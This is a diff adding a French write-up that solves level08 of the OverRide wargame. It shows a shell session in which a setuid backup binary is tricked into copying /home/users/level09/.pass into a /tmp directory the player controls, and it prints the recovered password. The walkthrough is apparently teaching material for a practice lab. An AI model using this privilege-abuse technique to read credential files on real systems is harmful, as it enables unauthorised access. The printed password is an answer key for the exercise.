@@ -1,0 +1,50 @@
+    __               ______  ____ 
+   / /__ _   _____  / / __ \( __ )
+  / / _ \ | / / _ \/ / / / / __  |
+ / /  __/ |/ /  __/ / /_/ / /_/ / 
+/_/\___/|___/\___/_/\____/\____/  
+                                  
+                                  
+Pour celui ci nous allons procéder étape par étape :
+
+level08@OverRide:~$ ./level08
+Usage: ./level08 filename
+ERROR: Failed to open (null)
+
+Il attend un file or nous ne pouvons pas créer de file dans notre home basculons donc vers /tmp
+
+  level08@OverRide:/tmp$ echo AAAA > test
+  
+  level08@OverRide:/tmp$ ~/level08 test
+  ERROR: Failed to open ./backups/.log
+
+Créeons ce dossier backups ansi que le fichier .log :
+
+  level08@OverRide:/tmp$ mkdir backups
+  
+  level08@OverRide:/tmp/backups$ touch .log
+
+Rééssayons on constate qu'un fichier test est crée dans le dossier backups :
+
+  level08@OverRide:/tmp$ ~/level08 test
+  
+  level08@OverRide:/tmp$ cat backups/test
+  AAAA
+
+Comme le binaire posséde les suid nous pouvons tenter de récuperer le .pass en procédant de la même façon :
+
+  level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
+  
+  ERROR: Failed to open ./backups//home/users/level09/.pass
+
+Créeons ce le path attendu :
+
+  level08@OverRide:/tmp/backups$ mkdir -p backups/home/users/level09/
+
+  level08@OverRide:/tmp/backups$ ~/level08 /home/users/level09/.pass
+
+  level08@OverRide:/tmp/backups$ cat backups/home/users/level09/.pass
+  fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+
+
+NEXT ...
